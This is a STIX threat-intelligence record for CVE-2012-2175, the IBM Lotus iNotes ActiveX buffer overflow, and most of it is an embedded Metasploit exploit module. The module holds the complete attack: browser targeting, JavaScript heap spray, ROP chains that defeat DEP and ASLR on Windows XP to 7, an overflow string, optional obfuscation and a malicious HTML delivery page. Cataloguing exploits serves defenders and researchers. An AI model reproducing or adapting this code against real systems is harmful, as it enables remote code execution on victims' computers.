{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3573c00e-2109-4e68-86e2-b5c4612b41a4",
    "created": "2024-08-14T16:42:57.344907Z",
    "modified": "2024-08-14T16:42:57.344911Z",
    "name": "\"IBM Lotus iNotes dwa85W ActiveX Buffer Overflow\"",
    "description": " This module exploits a buffer overflow vulnerability on the UploadControl ActiveX. The vulnerability exists in the handling of the \"Attachment_Times\" property, due to the insecure usage of the _swscanf. The affected ActiveX is provided by the dwa85W.dll installed with the IBM Lotus iNotes ActiveX installer.  This module has been tested successfully on IE6-IE9 on Windows XP, Vista and 7 using the dwa85W.dll 85.3.3.0 as installed with Lotus Domino 8.5.3.  In order to bypass ASLR the no aslr compatible module dwabho.dll is used. This one is installed with the iNotes ActiveX.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/inotes_dwa85w_bof.rb",
            "external_id": "inotes_dwa85w_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-2175"
        },
        {
            "source_name": "reference",
            "url": "http://www-304.ibm.com/support/docview.wss?uid=swg21596862"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::RopDb\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #\n  #autopwn_info({\n  #  :ua_name    => HttpClients::IE,\n  #  :ua_minver  => \"6.0\",\n  #  :ua_maxver  => \"9.0\",\n  #  :javascript => true,\n  #  :os_name => OperatingSystems::Match::WINDOWS,\n  #  :rank       => Rank,\n  #  :classid    => \"{0F2AAAE3-7E9E-4b64-AB5D-1CA24C6ACB9C}\",\n  #  :method     => \"Attachment_Times\"\n  #})\n\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"IBM Lotus iNotes dwa85W ActiveX Buffer Overflow\",\n      'Description'    => %q{\n          This module exploits a buffer overflow vulnerability on the UploadControl\n        ActiveX. The vulnerability exists in the handling of the \"Attachment_Times\"\n        property, due to the insecure usage of the _swscanf. The affected ActiveX is\n        provided by the dwa85W.dll installed with the IBM Lotus iNotes ActiveX installer.\n\n        This module has been tested successfully on IE6-IE9 on Windows XP, Vista and 7,\n        using the dwa85W.dll 85.3.3.0 as installed with Lotus Domino 8.5.3.\n\n        In order to bypass ASLR the no aslr compatible module dwabho.dll is used. This one\n        is installed with the iNotes ActiveX.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Gaurav Baruah', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2012-2175'],\n          [ 'OSVDB', '82755' ],\n          [ 'BID', '53879' ],\n          [ 'ZDI', '12-132' ],\n          [ 'URL', 'http://www-304.ibm.com/support/docview.wss?uid=swg21596862' ]\n        ],\n      'Payload'        =>\n        {\n          'Space' => 978,\n          'DisableNops' => true,\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\" # Stack adjustment # add esp, -3500\n        },\n      'DefaultOptions'  =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # dwa85W.dll 85.3.3.0\n          [ 'Automatic', {} ],\n          [ 'IE 6 on Windows XP SP3', { 'Rop' => nil,     'Offset' => '0x5F4', 'Ret' => 0x0c0c0c0c } ],\n          [ 'IE 7 on Windows XP SP3', { 'Rop' => nil,     'Offset' => '0x5F4', 'Ret' => 0x0c0c0c0c } ],\n          [ 'IE 8 on Windows XP SP3', { 'Rop' => :msvcrt, 'Offset' => '0x5f4', 'Ret' => 0x77C34FBF } ], # pop esp # ret # msvcrt.dll\n          [ 'IE 7 on Windows Vista',  { 'Rop' => nil,     'Offset' => '0x5f4', 'Ret' => 0x0c0c0c0c } ],\n          [ 'IE 8 on Windows Vista',  { 'Rop' => :notes,  'Offset' => '0x5f4', 'Ret' => 0x1000f765 } ], # pop eax # ret # dwabho.dll\n          [ 'IE 8 on Windows 7',      { 'Rop' => :notes,  'Offset' => '0x5f4', 'Ret' => 0x1000f765 } ], # pop eax # ret # dwabho.dll\n          [ 'IE 9 on Windows 7',      { 'Rop' => :notes,  'Offset' => '0x5fe', 'Ret' => 0x1000f765 } ]  # pop eax # ret # dwabho.dll\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-06-01',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])\n      ])\n\n  end\n\n  def get_target(agent)\n    #If the user is already specified by the user, we'll just use that\n    return target if target.name != 'Automatic'\n\n    nt = agent.scan(/Windows NT (\\d\\.\\d)/).flatten[0] || ''\n    ie = agent.scan(/MSIE (\\d)/).flatten[0] || ''\n\n    ie_name = \"IE #{ie}\"\n\n    case nt\n    when '5.1'\n      os_name = 'Windows XP SP3'\n    when '6.0'\n      os_name = 'Windows Vista'\n    when '6.1'\n      os_name = 'Windows 7'\n    end\n\n    targets.each do |t|\n      if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))\n        print_status(\"Target selected as: #{t.name}\")\n        return t\n      end\n    end\n\n    return nil\n  end\n\n  def ie_heap_spray(my_target, p)\n    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4, Rex::Arch.endian(target.arch))\n    js_random_nops = Rex::Text.to_unescape(make_nops(4), Rex::Arch.endian(my_target.arch))\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    # Land the payload at 0x0c0c0c0c\n    case my_target\n    when targets[7]\n      # IE 9 on Windows 7\n      js = %Q|\n      function randomblock(blocksize)\n      {\n        var theblock = \"\";\n        for (var i = 0; i < blocksize; i++)\n        {\n          theblock += Math.floor(Math.random()*90)+10;\n        }\n        return theblock;\n      }\n\n      function tounescape(block)\n      {\n        var blocklen = block.length;\n        var unescapestr = \"\";\n        for (var i = 0; i < blocklen-1; i=i+4)\n        {\n          unescapestr += \"%u\" + block.substring(i,i+4);\n        }\n        return unescapestr;\n      }\n\n      var heap_obj = new heapLib.ie(0x10000);\n      var code = unescape(\"#{js_code}\");\n      var #{randnop} = \"#{js_random_nops}\";\n      var nops = unescape(#{randnop});\n      while (nops.length < 0x80000) nops += nops;\n      var offset_length = #{my_target['Offset']};\n      for (var i=0; i < 0x1000; i++) {\n        var padding = unescape(tounescape(randomblock(0x1000)));\n        while (padding.length < 0x1000) padding+= padding;\n        var junk_offset = padding.substring(0, offset_length);\n        var single_sprayblock = junk_offset + code + nops.substring(0, 0x800 - code.length - junk_offset.length);\n        while (single_sprayblock.length < 0x20000) single_sprayblock += single_sprayblock;\n        sprayblock = single_sprayblock.substring(0, (0x40000-6)/2);\n        heap_obj.alloc(sprayblock);\n      }\n      |\n\n    else\n      # For IE 6, 7, 8\n      js = %Q|\n      var heap_obj = new heapLib.ie(0x20000);\n      var code = unescape(\"#{js_code}\");\n      var #{randnop} = \"#{js_nops}\";\n      var nops = unescape(#{randnop});\n      while (nops.length < 0x80000) nops += nops;\n      var offset = nops.substring(0, #{my_target['Offset']});\n      var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);\n      while (shellcode.length < 0x40000) shellcode += shellcode;\n      var block = shellcode.substring(0, (0x80000-6)/2);\n      heap_obj.gc();\n      for (var i=1; i < 0x300; i++) {\n        heap_obj.alloc(block);\n      }\n      |\n\n    end\n\n    js = heaplib(js, {:noobfu => true})\n\n    if datastore['OBFUSCATE']\n      js = ::Rex::Exploitation::JSObfu.new(js)\n      js.obfuscate(memory_sensitive: true)\n    end\n\n    return js\n  end\n\n  def get_payload(t, cli)\n    code = payload.encoded\n\n    # No rop. Just return the payload.\n    return code if t['Rop'].nil?\n\n    # Both ROP chains generated by mona.py - See corelan.be\n    case t['Rop']\n    when :msvcrt\n      print_status(\"Using msvcrt ROP\")\n      rop_payload = generate_rop_payload('msvcrt', code, {'target'=>'xp'})#{'pivot'=>stack_pivot, 'target'=>'xp'})\n    else\n      print_status(\"Using dwabho.dll ROP\")\n      # gadgets from dwabho.dll, using mona.py\n      rop_payload = [\n        0x1000f765, # POP EAX # RETN\n        0x1001a22c, # ptr to &VirtualAlloc() [IAT dwabho.dll]\n        0x10010394, # JMP DWORD PTR DS:[EAX]\n        0x0c0c0c2c, # ret after VirtualAlloc\n        0x0c0c0c2c, # lpAddress\n        0x00000400, # dwSize\n        0x00001000, # flAllocationType\n        0x00000040 # flProtect\n      ].pack(\"V*\")\n      rop_payload << code\n    end\n\n    return rop_payload\n  end\n\n  def load_exploit_html(my_target, cli)\n    p  = get_payload(my_target, cli)\n    js = ie_heap_spray(my_target, p)\n\n    bof = rand_text_alpha(552) # offset to eip\n    bof << [my_target.ret].pack(\"V\")\n\n    case my_target['Rop']\n    when :msvcrt\n      bof << rand_text_alpha(4)\n      bof << [0x0c0c0c0c].pack(\"V\") # new ESP\n    when :notes\n      bof << rand_text_alpha(4)\n      bof << [0x0c0c0c00].pack(\"V\") # eax\n      bof << [0x1000f49a].pack(\"V\") # pop esp # dec ecx # add byte ptr ds:[eax],al # pop ecx # pop ecx # retn # dwabho.dll\n      bof << [0x0c0c0c04].pack(\"V\") # new ESP\n    end\n\n    my_bof = Rex::Text.to_unescape(bof)\n\n    html = %Q|\n    <html>\n    <head>\n    <script>\n    #{js}\n    </script>\n    </head>\n    <body>\n    <object id=\"UploadControl\" width=\"100%\" height=\"100%\" classid=\"clsid:0F2AAAE3-7E9E-4b64-AB5D-1CA24C6ACB9C\">\n      <param name=\"General_Mode\" value=\"1\">\n      <param name=\"General_URL\" value=\"http://#{rand_text_alpha(rand(10) + 5)}\">\n    </object>\n    <script>\n      var bof = unescape(\"#{my_bof}\");\n      var my_time = \"#{rand_text_numeric(2)}/#{rand_text_numeric(2)}/#{rand_text_numeric(4)} #{rand_text_numeric(2)}:#{rand_text_numeric(2)}:#{rand_text_numeric(2)} \";\n      my_time += bof;\n      my_time += \" GMT\";\n      UploadControl.Attachment_Times = my_time;\n    </script>\n    </body>\n    </html>\n    |\n\n    return html\n  end\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n    uri   = request.uri\n    print_status(\"Requesting: #{uri}\")\n\n    my_target = get_target(agent)\n    # Avoid the attack if no suitable target found\n    if my_target.nil?\n      print_error(\"Browser not supported, sending 404: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    html = load_exploit_html(my_target, cli)\n    html = html.gsub(/^ {4}/, '')\n    print_status(\"Sending HTML...\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-06-01",
    "x_mitre_platforms": [
        "win'"
    ]
}